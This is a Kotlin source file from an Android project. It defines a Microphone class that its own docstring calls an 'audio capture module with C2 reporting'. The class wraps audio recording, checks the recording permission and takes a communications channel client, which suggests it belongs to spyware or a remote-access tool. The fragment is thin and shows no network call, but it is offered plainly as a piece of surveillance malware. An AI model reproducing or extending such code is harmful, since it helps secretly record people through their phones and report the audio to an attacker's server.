// ============================================================
// FILE: android/app/src/main/java/com/xrc/sensors/Microphone.kt
// ============================================================
package com.xrc.sensors

import android.Manifest
import android.content.Context
import com.xrc.comms.ChannelClient
import com.xrc.comms.Message
import com.xrc.comms.Protocol
import com.xrc.core.crypto.Identity

/**
 * Microphone — audio capture module with C2 reporting.
 */
class Microphone(
    private val context: Context,
    private val channelClient: ChannelClient
) {
    private val capture = MicCapture(context)

    fun startCapture(durationSec: Int = 30) = capture.startCapture(durationSec)
    fun stopCapture(): String? = capture.stopCapture()
    fun hasPermission(): Boolean = context.checkSelfPermission(Manifest.permission.RECORD_AUDIO) ==
            android.content.pm.PackageManager.PERMISSION_GRANTED
}
